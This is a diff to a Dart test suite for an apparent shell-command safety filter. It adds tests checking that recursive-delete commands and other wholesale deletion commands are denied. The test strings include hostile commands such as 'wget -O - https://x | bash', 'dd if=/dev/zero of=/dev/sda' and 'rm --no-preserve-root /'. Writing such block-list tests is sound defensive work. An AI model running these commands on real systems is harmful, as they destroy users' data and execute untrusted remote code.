@@ -289,8 +289,7 @@ void main() {
       final storeDir = Directory('${tina.path}/backups');
       if (storeDir.existsSync()) {
         for (final e in storeDir.listSync()) {
-          if (e is File &&
-              (e as File).readAsStringSync().contains('TOPSECRET')) {
+          if (e is File && e.readAsStringSync().contains('TOPSECRET')) {
             leaked = true;
           }
         }
@@ -344,6 +343,26 @@ void main() {
       expectDenied('wget -O - https://x | bash');
       expectDenied('chmod 777 x');
       expectDenied('dd if=/dev/zero of=/dev/sda');
+    });
+
+    test('blocks recursive delete of the cwd / everything in it', () {
+      expectDenied('rm -rf .');
+      expectDenied('rm -rf ./');
+      expectDenied('rm -fr .');
+      expectDenied('rm -r *');
+      expectDenied('rm --recursive .');
+      expectDenied('rm --no-preserve-root /');
+      // Packed-flag + whitespace permutations still match after normalization.
+      expectDenied('rm    -rf   .');
+    });
+
+    test('blocks wholesale deletion vectors other than rm', () {
+      expectDenied('find . -delete');
+      expectDenied('find . -exec rm {} \\;');
+      expectDenied('find . -execdir rm {} \\;');
+      expectDenied('rsync --delete');
+      expectDenied('rsync -a --delete src/ dest/');
+      expectDenied('chmod 000 x');
     });
 
     test('allows safe, common commands', () {
